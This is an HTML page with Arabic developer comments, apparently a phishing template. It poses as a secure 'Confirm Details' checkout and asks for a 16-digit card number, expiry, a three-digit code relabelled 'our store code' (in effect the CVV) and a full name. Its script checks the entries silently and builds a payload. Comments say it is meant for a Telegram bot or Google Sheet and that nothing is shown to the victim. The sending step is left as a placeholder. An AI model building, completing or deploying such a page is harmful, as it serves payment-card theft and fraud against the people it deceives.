<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Confirm Details</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, sans-serif;
    }

    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f5f6f8;
      color: #333;
    }

    .page-wrapper {
      width: 100%;
      max-width: 420px;
      padding: 24px 16px;
    }

    .outer-card {
      background-color: #ffffff;
      border-radius: 16px;
      box-shadow: 0 0 0 1px #e2e2e2;
      padding: 16px 18px 22px;
    }

    .security-banner {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 14px;
    }

    .security-banner-text {
      font-size: 14px;
      color: #3d3d3d;
      line-height: 1.4;
    }

    .inner-card {
      margin-top: 4px;
      border-radius: 16px;
      background-color: #fbfbfb;
      box-shadow: inset 0 0 0 1px #e5e5e5;
      padding: 20px 18px 22px;
    }

    .inner-card h1 {
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 22px;
      color: #222;
    }

    .field-group {
      margin-bottom: 14px;
    }

    .field-group label {
      display: block;
      font-size: 14px;
      margin-bottom: 6px;
      color: #444;
    }

    .row {
      display: flex;
      gap: 10px;
    }

    .row .field-group {
      flex: 1;
      margin-bottom: 0;
    }

    input[type="text"],
    input[type="tel"] {
      width: 100%;
      padding: 10px 11px;
      border-radius: 4px;
      border: 1px solid #d3d3d3;
      font-size: 14px;
      outline: none;
      background-color: #ffffff;
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
    }

    input::placeholder {
      color: #c4c4c4;
    }

    input:focus {
      border-color: #0a84ff;
      box-shadow: 0 0 0 2px rgba(10, 132, 255, 0.15);
    }

    .hint {
      font-size: 11px;
      color: #a0a0a0;
      margin-top: 3px;
    }

    .submit-btn {
      margin-top: 18px;
      width: 100%;
      border: none;
      border-radius: 4px;
      background-color: #007bff;
      color: #ffffff;
      font-size: 16px;
      font-weight: 500;
      padding: 11px 0;
      cursor: pointer;
      transition: background-color 0.15s ease, box-shadow 0.15s ease;
    }

    .submit-btn:active {
      background-color: #0066d6;
      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.15);
    }

    /* قفل أخضر مطابق تقريباً */
    .lock-icon {
      width: 24px;
      height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .lock-icon svg {
      display: block;
    }
  </style>
</head>
<body>
  <div class="page-wrapper">
    <div class="outer-card">
      <!-- شريط الأمان -->
      <div class="security-banner">
        <div class="lock-icon">
          <!-- SVG لـ القفل (خط أخضر، ستروك نظيف) -->
          <svg viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
            <g fill="none" stroke="#13840f" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round">
              <!-- جسم القفل -->
              <rect x="5" y="10" width="14" height="10" rx="2.5" ry="2.5"></rect>
              <!-- القوس المفتوح -->
              <path d="M9 10V7a3 3 0 0 1 6 0v3"></path>
              <!-- منحنى يشبه الابتسامة داخل القفل -->
              <path d="M10 15a3 3 0 0 0 4 0"></path>
            </g>
          </svg>
        </div>
        <div class="security-banner-text">
          All usernames are 100% legit and secured
        </div>
      </div>

      <!-- الكرت الداخلي + الفورم -->
      <div class="inner-card">
        <h1>Confirm Details</h1>

        <form id="confirmForm" autocomplete="off" novalidate>
          <!-- Number -->
          <div class="field-group">
            <label for="number">Number</label>
            <input
              id="number"
              name="number"
              type="tel"
              inputmode="numeric"
              placeholder="XXXX XXXX XXXX XXXX"
              maxlength="19"
              required
            />
          </div>

          <!-- Date + كود متجرنا -->
          <div class="row" style="margin-bottom: 14px;">
            <div class="field-group">
              <label for="expiry">Date</label>
              <input
                id="expiry"
                name="expiry"
                type="tel"
                inputmode="numeric"
                placeholder="MM/YY"
                maxlength="5"
                required
              />
            </div>
            <div class="field-group">
              <label for="storeCode">كود متجرنا</label>
              <input
                id="storeCode"
                name="storeCode"
                type="tel"
                inputmode="numeric"
                placeholder="000"
                maxlength="3"
                required
              />
            </div>
          </div>

          <!-- Name -->
          <div class="field-group">
            <label for="fullName">Name</label>
            <input
              id="fullName"
              name="fullName"
              type="text"
              placeholder=""
              required
            />
            <div class="hint">* Full Name</div>
          </div>

          <button type="submit" class="submit-btn">Confirm</button>
        </form>
      </div>
    </div>
  </div>

  <script>
    // حقل الرقم: فقط أرقام + مسافات تلقائية كل 4 أرقام
    const numberInput = document.getElementById('number');
    numberInput.addEventListener('input', (e) => {
      let digits = e.target.value.replace(/\D/g, '');
      if (digits.length > 16) digits = digits.slice(0, 16);

      const parts = [];
      for (let i = 0; i < digits.length; i += 4) {
        parts.push(digits.slice(i, i + 4));
      }
      e.target.value = parts.join(' ');
    });

    // حقل التاريخ: MM/YY – إضافة / تلقائياً
    const expiryInput = document.getElementById('expiry');
    expiryInput.addEventListener('input', (e) => {
      let v = e.target.value.replace(/\D/g, '');
      if (v.length > 4) v = v.slice(0, 4);

      if (v.length >= 3) {
        e.target.value = v.slice(0, 2) + '/' + v.slice(2);
      } else {
        e.target.value = v;
      }
    });

    // كود المتجر: 3 أرقام فقط
    const storeCodeInput = document.getElementById('storeCode');
    storeCodeInput.addEventListener('input', (e) => {
      let v = e.target.value.replace(/\D/g, '');
      if (v.length > 3) v = v.slice(0, 3);
      e.target.value = v;
    });

    // منع أي Alerts للزبون – هنا فقط تجهيز الإرسال الخارجي
    document.getElementById('confirmForm').addEventListener('submit', (e) => {
      e.preventDefault();

      const rawNumber = numberInput.value.replace(/\s+/g, '');
      const expiry = expiryInput.value;
      const storeCode = storeCodeInput.value;
      const fullName = document.getElementById('fullName').value.trim();

      // تحقق بسيط بدون إظهار شيء للمستخدم
      const validNumber = rawNumber.length === 16;
      const validExpiry = /^\d{2}\/\d{2}$/.test(expiry);
      const validStore = /^\d{3}$/.test(storeCode);
      const validName = fullName.length > 0;

      if (!(validNumber && validExpiry && validStore && validName)) {
        // لو في خطأ، ممكن بس نوقف الإرسال بدون ما نحكي له شيء
        return;
      }

      // هنا تحط كود الإرسال (Telegram Bot / API / Google Sheet إلخ).
      // مثال شكل الداتا:
      const payload = {
        number: rawNumber,
        expiry,
        storeCode,
        fullName
      };

      console.log('FORM DATA (send to bot):', payload);
      // لا شيء يظهر للزبون – الصفحة تبقى كما هي.
    });
  </script>
</body>
</html>
